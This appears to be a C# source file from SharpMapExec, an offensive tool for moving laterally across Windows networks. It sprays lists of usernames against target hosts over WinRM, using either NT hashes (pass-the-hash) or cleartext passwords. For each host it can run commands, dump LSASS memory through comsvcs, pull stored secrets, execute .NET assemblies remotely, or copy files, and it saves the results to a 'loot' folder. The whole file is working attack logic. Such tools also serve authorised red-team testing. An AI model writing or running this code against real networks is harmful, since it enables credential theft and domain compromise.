using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using static SharpMapExec.Helpers.SecurityContext;

namespace SharpMapExec.Lib
{
    public class ntlmwinrm
    {
        public static void NtlmWinRm<T>(string[] users, string domain, T secrets, string[] computernames, string module, string moduleargument,string path, string destination, List<string> flags)
        {
            if (module.Contains("exec") && moduleargument.Length == 0)
            {
                Console.WriteLine("[-] Missing exec argument");
                return;
            }
            if (module.Contains("assembly") && !File.Exists(path))
            {
                Console.WriteLine("[-] Missing assembly path");
                return;
            }
            if (module.Contains("download") && (String.IsNullOrEmpty(path) || String.IsNullOrEmpty(destination)))
            {
                Console.WriteLine("[-] Need path and destination");
                return;
            }
            //StartJob(users, domain, secrets, computernames, module, moduleargument, path, destination, flags);
            var listOfTasks = new List<Task>();
            listOfTasks.Add(new Task(() => StartJob(users, domain, secrets, computernames, module, moduleargument, path, destination, flags)));
            Tasks.StartAndWaitAllThrottled(listOfTasks, 1);
        }

        public static void StartJob<T>(string[] users, string domain, T secrets, string[] computernames, string module, string moduleargument, string path, string destination, List<string> flags)
        { 
            string[] passwords;
            if (typeof(T) == typeof(NTHash))
            {
                passwords = (string[])secrets.GetType().GetProperties().Single(pi => pi.Name == "Nthash").GetValue(secrets, null);
                foreach (string user in users)
                {
                    foreach (string password in passwords)
                    {
                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret:   {0}", password));
                        Console.WriteLine();
                        SetThreadToken(user, domain, password);
                        foreach (string computername in computernames)
                        {
                            Console.WriteLine(String.Format("[*] Checking {0}", computername));
                            if (!Misc.CheckHostPort(computername, 5985))
                            {
                                Console.WriteLine(String.Format("[-] Could Not Reach {0}:5985", computername));
                                Console.WriteLine();
                                continue;
                            }
                            if (!Directory.Exists(Path.Combine("loot", computername)))
                            {
                                Directory.CreateDirectory(Path.Combine("loot", computername));
                            }
                            if (module.Length == 0 || module.Contains("exec"))
                            {
                                Wsman.CheckLocalAdmin(computername, moduleargument, flags);
                            }
                            else if (module.Contains("comsvcs"))
                            {
                                Wsman.InvokeComSvcsLsassDump(computername);
                            }
                            else if (module.Contains("secrets") || module.Contains("secret"))
                            {
                                Wsman.GetSecrets(computername);
                            }
                            else if (module.Contains("assembly"))
                            {
                                Wsman.ExecuteAssembly(computername, path, moduleargument, flags);
                            }
                            else if (module.Contains("download"))
                            {
                                Wsman.CopyFile(computername, path, destination);
                            }
                            Console.WriteLine("");
                        }
                    }
                }
            }
            else if (typeof(T) == typeof(ClearText))
            {
                passwords = (string[])secrets.GetType().GetProperties().Single(pi => pi.Name == "Cleartext").GetValue(secrets, null);
                foreach (string user in users)
                {
                    foreach (string password in passwords)
                    {
                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret: {0}", password));
                        Console.WriteLine();
                        using (new Impersonator.Impersonation(domain, user, password))
                        {
                            foreach (string computername in computernames)
                            {
                                Console.WriteLine(String.Format("[*] Checking {0}", computername));
                                if (!Misc.CheckHostPort(computername, 5985))
                                {
                                    Console.WriteLine(String.Format("[-] Could Not Reach {0}:5985", computername));
                                    Console.WriteLine();
                                    continue;
                                }
                                if (!Directory.Exists(Path.Combine("loot", computername)))
                                {
                                    Directory.CreateDirectory(Path.Combine("loot", computername));
                                }
                                if (module.Length == 0 || module.Contains("exec"))
                                {
                                    Wsman.CheckLocalAdmin(computername, moduleargument, flags);
                                }
                                else if (module.Contains("comsvcs"))
                                {
                                    Wsman.InvokeComSvcsLsassDump(computername);
                                }
                                else if (module.Contains("secrets") || module.Contains("secret"))
                                {
                                    Wsman.GetSecrets(computername);
                                }
                                else if (module.Contains("assembly"))
                                {
                                    Wsman.ExecuteAssembly(computername, path, moduleargument, flags);
                                }
                                else if (module.Contains("download"))
                                {
                                    Wsman.CopyFile(computername, path, destination);
                                }
                                Console.WriteLine("");
                            }
                        }
                    }
                }
            }
        }
    }
}